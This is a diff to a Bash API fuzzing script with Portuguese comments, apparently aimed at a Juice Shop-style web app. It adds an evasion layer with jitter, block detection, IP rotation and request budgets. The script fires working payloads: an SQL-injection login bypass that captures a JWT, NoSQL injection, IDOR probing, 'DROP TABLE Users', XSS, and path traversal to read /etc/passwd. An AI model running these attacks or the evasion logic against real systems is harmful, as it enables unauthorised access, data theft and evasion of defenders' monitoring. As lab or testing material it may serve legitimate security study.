@@ -12,6 +12,10 @@
 #   4. Testar JSON injection em POST bodies
 #   5. Detectar information disclosure em responses de admin
 # Emite: API_VULN_FOUND: <tipo> <endpoint> <evidencia>
+#
+# EVASÃO (evasion_lib.sh): budget global, jitter, detecção de bloqueio com
+# rotação de IP, 1 request onde antes eram 2 (bug de request duplo), pula
+# portas emuladas, aborto gracioso. enabled=0 → padrão de requests idêntico.
 # ==============================================================================
 set -u
 
@@ -20,18 +24,28 @@ PORT="${2:-80}"
 SCHEME="${3:-http}"
 CURL_OPTS="-sk --max-time 15"
 
+# ---- Camada de evasão -----------------------------------------------------------
+_EV_LIB="$(dirname "${BASH_SOURCE[0]}")/evasion_lib.sh"
+[ -f "$_EV_LIB" ] || _EV_LIB="/ruadan/evasion_lib.sh"
+. "$_EV_LIB"
+ev_init "$TARGET" "$PORT" "$SCHEME"
+ev_skip_port && exit 0
+ev_should_abort && exit 0
+
 BASE_URL="${SCHEME}://${TARGET}:${PORT}"
 if [ "$SCHEME" = "http" ]; then
-    _redir=$(curl $CURL_OPTS -o /dev/null -w "%{redirect_url}" "${BASE_URL}/" 2>/dev/null)
+    _redir=$(curl $CURL_OPTS ${EV__IDA[@]+"${EV__IDA[@]}"} -o /dev/null -w "%{redirect_url}" "${BASE_URL}/" 2>/dev/null)
     if [ -n "$_redir" ] && [[ "$_redir" == https* ]]; then
         BASE_URL="${_redir%/}"
     fi
 fi
+ev_set_probe_url "${BASE_URL}/"
 echo "[api-fuzz] Alvo: ${BASE_URL}"
 
 # ---- 1. Captura JWT via SQLi bypass -------------------------------------------
 LOGIN_BODY='{"email":"'"'"' OR 1=1--","password":"x"}'
-LOGIN_RESP=$(curl $CURL_OPTS -X POST "${BASE_URL}/rest/user/login" -H "Content-Type: application/json" -d "$LOGIN_BODY" 2>/dev/null)
+ev_body $CURL_OPTS -X POST "${BASE_URL}/rest/user/login" -H "Content-Type: application/json" -d "$LOGIN_BODY"
+LOGIN_RESP="$EV_BODY"
 JWT=$(echo "$LOGIN_RESP" | grep -oE '"token":"[^"]+"' | sed 's/"token":"//;s/"$//' | head -1)
 if [ -z "$JWT" ]; then
     echo "[api-fuzz] Sem JWT — fuzzing autenticado impossível."
@@ -73,9 +87,10 @@ echo "[api-fuzz] Testando ${#ENDPOINTS[@]} endpoints com autenticação..."
 # ---- 3. IDOR: trocar ID de usuário --------------------------------------------
 VULN_COUNT=0
 for EP in "${ENDPOINTS[@]}"; do
+    ev_should_abort && exit 0
     # GET com JWT admin (acesso permitido)
-    RESP_AUTH=$(curl $CURL_OPTS -H "$AUTH" "${BASE_URL}${EP}" 2>/dev/null)
-    CODE_AUTH=$(curl $CURL_OPTS -H "$AUTH" -o /dev/null -w "%{http_code}" "${BASE_URL}${EP}" 2>/dev/null)
+    ev_body_and_code $CURL_OPTS -H "$AUTH" "${BASE_URL}${EP}"
+    RESP_AUTH="$EV_BODY"; CODE_AUTH="$EV_CODE"
     SIZE_AUTH=${#RESP_AUTH}
 
     if [ "$CODE_AUTH" = "200" ] && [ "$SIZE_AUTH" -gt 50 ]; then
@@ -84,7 +99,8 @@ for EP in "${ENDPOINTS[@]}"; do
         # IDOR: trocar /1 por /2, /3 (dados de outros usuários)
         if echo "$EP" | grep -qE '/(user|basket|order|card|address)/\d+'; then
             OTHER_ID=$(echo "$EP" | sed 's/\/[0-9]*$/\/3/')
-            RESP_OTHER=$(curl $CURL_OPTS -H "$AUTH" -o /dev/null -w "%{http_code}" "${BASE_URL}${OTHER_ID}" 2>/dev/null)
+            ev_code $CURL_OPTS -H "$AUTH" "${BASE_URL}${OTHER_ID}"
+            RESP_OTHER="$EV_CODE"
             if [ "$RESP_OTHER" = "200" ]; then
                 echo "API_VULN_FOUND: IDOR ${OTHER_ID} — acessível com JWT de outro usuário (HTTP ${RESP_OTHER})"
                 VULN_COUNT=$((VULN_COUNT+1))
@@ -112,10 +128,10 @@ NOSQL_PAYLOADS=(
 
 echo "[api-fuzz] Testando NoSQL injection em POST /rest/user/login..."
 for PAYLOAD in "${NOSQL_PAYLOADS[@]}"; do
-    RESP=$(curl $CURL_OPTS -X POST "${BASE_URL}/rest/user/login" \
-        -H "Content-Type: application/json" -H "$AUTH" -d "$PAYLOAD" 2>/dev/null)
-    CODE=$(curl $CURL_OPTS -X POST "${BASE_URL}/rest/user/login" \
-        -H "Content-Type: application/json" -H "$AUTH" -d "$PAYLOAD" -o /dev/null -w "%{http_code}" 2>/dev/null)
+    ev_should_abort && exit 0
+    ev_body_and_code $CURL_OPTS -X POST "${BASE_URL}/rest/user/login" \
+        -H "Content-Type: application/json" -H "$AUTH" -d "$PAYLOAD"
+    RESP="$EV_BODY"; CODE="$EV_CODE"
     if [ "$CODE" = "200" ] && echo "$RESP" | grep -q "token"; then
         echo "API_VULN_FOUND: NOSQL_INJECTION /rest/user/login — payload: ${PAYLOAD:0:50}... (HTTP ${CODE} + token)"
         VULN_COUNT=$((VULN_COUNT+1))
@@ -125,9 +141,14 @@ done
 # ---- 5. Search injection --------------------------------------------------------
 echo "[api-fuzz] Testando injeção em /rest/products/search?q=..."
 for INJ in "'; DROP TABLE Users; --" "<script>alert(1)</script>" "' OR '1'='1" "../../etc/passwd"; do
-    INJ_ENCODED=$(echo "$INJ" | sed 's/ /%20/g; s/"/%22/g; s//%27/g; s/</%3C/g; s/>/%3E/g; s/;/%3B/g')
-    RESP=$(curl $CURL_OPTS "${BASE_URL}/rest/products/search?q=${INJ_ENCODED}" 2>/dev/null)
-    CODE=$(curl $CURL_OPTS "${BASE_URL}/rest/products/search?q=${INJ_ENCODED}" -o /dev/null -w "%{http_code}" 2>/dev/null)
+    ev_should_abort && exit 0
+    if [ "$EV_ENABLED" = 1 ]; then
+        INJ_ENCODED=$(ev_urlencode "$INJ")
+    else
+        INJ_ENCODED=$(echo "$INJ" | sed 's/ /%20/g; s/"/%22/g; s//%27/g; s/</%3C/g; s/>/%3E/g; s/;/%3B/g')
+    fi
+    ev_body_and_code $CURL_OPTS "${BASE_URL}/rest/products/search?q=${INJ_ENCODED}"
+    RESP="$EV_BODY"; CODE="$EV_CODE"
     if [ "$CODE" = "200" ] && [ ${#RESP} -gt 100 ]; then
         # Verifica se a resposta contém dados que não deveriam estar lá
         if echo "$RESP" | grep -qi "error\|sql\|passwd\|root:"; then
@@ -140,11 +161,11 @@ done
 # ---- 6. POST body injection em endpoints ---------------------------------------
 echo "[api-fuzz] Testando POST body injection..."
 for EP in "/rest/save/review" "/rest/basket/1/product" "/api/Feedbacks"; do
+    ev_should_abort && exit 0
     for INJ in '{"message":"<script>alert(1)</script>"}' '{"message":{"$gt":""}}' '{"comment":"SELECT * FROM Users"}'; do
-        RESP=$(curl $CURL_OPTS -X POST "${BASE_URL}${EP}" \
-            -H "Content-Type: application/json" -H "$AUTH" -d "$INJ" 2>/dev/null)
-        CODE=$(curl $CURL_OPTS -X POST "${BASE_URL}${EP}" \
-            -H "Content-Type: application/json" -H "$AUTH" -d "$INJ" -o /dev/null -w "%{http_code}" 2>/dev/null)
+        ev_body_and_code $CURL_OPTS -X POST "${BASE_URL}${EP}" \
+            -H "Content-Type: application/json" -H "$AUTH" -d "$INJ"
+        RESP="$EV_BODY"; CODE="$EV_CODE"
         if [ "$CODE" = "200" ] || [ "$CODE" = "201" ]; then
             # Se aceitou payload sem sanitizar
             if echo "$RESP" | grep -qi "script\|SELECT\|error"; then
@@ -165,8 +186,9 @@ TRAV_PAYLOADS=(
     "/ftp/legal.md?md_debug=.md"
 )
 for p in "${TRAV_PAYLOADS[@]}"; do
-    RESP=$(curl $CURL_OPTS "${BASE_URL}${p}" 2>/dev/null)
-    CODE=$(curl $CURL_OPTS "${BASE_URL}${p}" -o /dev/null -w "%{http_code}" 2>/dev/null)
+    ev_should_abort && exit 0
+    ev_body_and_code $CURL_OPTS "${BASE_URL}${p}"
+    RESP="$EV_BODY"; CODE="$EV_CODE"
     if [ "$CODE" = "200" ] && echo "$RESP" | grep -q "root:"; then
         echo "API_VULN_FOUND: PATH_TRAVERSAL ${p:0:50} — /etc/passwd lido do servidor (HTTP ${CODE})"
         VULN_COUNT=$((VULN_COUNT+1))
